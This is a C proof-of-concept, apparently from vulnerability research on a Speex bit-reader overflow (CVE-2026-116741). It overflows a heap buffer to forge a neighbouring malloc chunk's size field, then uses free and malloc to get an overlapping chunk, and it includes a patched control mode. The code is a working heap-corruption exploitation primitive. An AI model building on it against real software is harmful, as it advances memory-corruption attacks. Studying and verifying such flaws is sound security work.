/* Allocator-size probe for CVE-2026-116741, additive to adjacent.c.
 * The second oversize read's bytes 0..7 land at buf+24..31, i.e. the
 * malloc chunk SIZE field of the 16-byte neighbour allocated immediately
 * after buf (bytes 8..15 land in its user area, as adjacent.c showed).
 * Here the fake size is 0x31, so free(v) puts a 0x20-sized chunk in the
 * 0x30 tcache bin and a later malloc(32) can re-return it with a larger
 * usable area, overlapping the following chunk's header.
 *
 * CONDITIONS differ from the staged rung-4 claim: this probe DOES free the
 * corrupted neighbour. It is a lab heap-layout observation only, with a
 * vendor-fixed control; no command, no wire path, no r5 claim. */
#include <speex/speex_bits.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define BUFSZ 16

int main(int argc, char **argv)
{
   int fixed = argc > 1 && strcmp(argv[1], "fixed") == 0;
   char *buf = (char *)malloc(BUFSZ);     /* chunk A, size field at buf-8 */
   char *v = (char *)malloc(BUFSZ);       /* chunk B, size field at buf+24 */
   char *scratch = (char *)malloc(128);   /* chunk C immediately after B */
   SpeexBits bits;
   char seed[8], p1[16], p2[16];
   size_t *bsize = (size_t *)(v - 8);     /* B's malloc chunk size field */
   size_t before, after, csize_before, csize_after;
   char *re;
   int i, overlap, reuse;

   if (!buf || !v || !scratch)
      return 90;
   memset(buf, 0, BUFSZ);
   memset(v, 0, BUFSZ);
   memset(scratch, 0, 128);
   printf("delta=%td\n", v - buf);
   if (v - buf != 32)
      return 3;                  /* layout assumption failed: UNKNOWN */

   before = *bsize;
   csize_before = *(size_t *)(scratch - 8);
   /* A plausible next-chunk size at B+fake_size+8, used by free()'s
    * next-chunk sanity check. Setup is harness-controlled heap layout. */
   *(size_t *)(scratch + 8) = 0x91;

   speex_bits_init_buffer(&bits, buf, BUFSZ);
   for (i = 0; i < 8; i++)
      seed[i] = (char)(0x11 + i);
   speex_bits_read_whole_bytes(&bits, seed, 8);
   for (i = 0; i < 16; i++)
      p1[i] = (char)('A' + i);
   speex_bits_read_whole_bytes(&bits, p1, 16);
   memset(p2, 0, sizeof(p2));
   p2[0] = 0x31;                  /* forged 0x30-size chunk, PREV_INUSE set */
   for (i = 8; i < 16; i++)
      p2[i] = (char)(0x21 + i);
   speex_bits_read_whole_bytes(&bits, p2, 16);
   after = *bsize;

   free(v);                       /* condition added by THIS probe only */
   re = (char *)malloc(32);       /* 0x30 bin: returns v only when corrupted */
   reuse = re == v;
   memset(re, 0xab, 32);          /* legal for a 0x30 chunk, reaches C header */
   csize_after = *(size_t *)(scratch - 8);
   overlap = csize_after != csize_before;

   printf("bsize_before=%#lx bsize_after=%#lx\n", before, after);
   printf("reuse=%d re=%p v=%p\n", reuse, (void *)re, (void *)v);
   printf("csize_before=%#lx csize_after=%#lx overlap=%d\n",
          csize_before, csize_after, overlap);

   return reuse == (fixed ? 0 : 1) &&
          overlap == (fixed ? 0 : 1) &&
          after == (fixed ? before : 0x31) ? 0 : 1;
}
